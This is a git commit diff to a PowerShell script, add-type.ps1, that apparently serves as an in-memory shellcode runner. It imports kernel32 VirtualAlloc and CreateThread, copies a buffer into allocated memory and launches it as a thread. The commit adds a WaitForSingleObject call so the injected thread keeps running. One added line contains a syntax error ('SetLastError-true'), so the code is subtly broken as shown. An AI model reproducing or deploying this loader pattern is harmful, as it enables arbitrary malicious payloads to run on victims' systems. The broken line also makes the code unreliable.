2dc37d4140ecca1ab8c786bb6dc175aebaf8c6ae
medusa <gerryfrank720@gmail.com>
2022-03-09 07:23:01 +0300

    modified add-type

--- add-type.ps1
+++ add-type.ps1
@@ -7,6 +7,8 @@ public class Kernel32 {
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32", CharSet=CharSet.Ansi)]
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll", SetLastError-true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 }
 "@
 
@@ -20,3 +22,4 @@ echo $size
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 
 $thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
